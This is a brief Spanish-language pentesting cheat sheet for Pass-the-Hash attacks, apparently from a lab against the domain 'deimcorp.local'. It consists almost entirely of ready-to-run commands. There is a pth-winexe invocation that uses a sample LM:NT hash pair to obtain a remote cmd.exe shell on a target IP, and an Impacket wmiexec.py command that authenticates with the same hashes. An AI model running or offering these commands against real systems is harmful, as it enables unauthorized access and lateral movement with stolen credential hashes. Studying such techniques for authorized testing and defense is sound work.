# Pass The Hash (PTH)

## Pth-winexe

```
pth-winexe -U 'deimcorp.local\usuario%LMHASH:NTHASH' //IP-MAQUINA cmd.exe
```

HASH -->

```bash
cbollin:1000:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

> Solo necesitas el **NTHASH** (`c39f2beb3d2ec06a62cb887fb391dee0`), ya que el **LMHASH** (`aad3b435b51404eeaad3b435b51404ee`) no es relevante.

Comando final -->

```bash
pth-winexe -U 'deimcorp.local\cbollin%aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0' //100.100.100.130 cmd.exe
```

> Si funciona, tendrás una revese shell.

## Wmiexec.py

```
wmiexec.py deimcorp.local/champi@100.100.100.130 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
```

> `-hashes LMHASH:NTHASH`
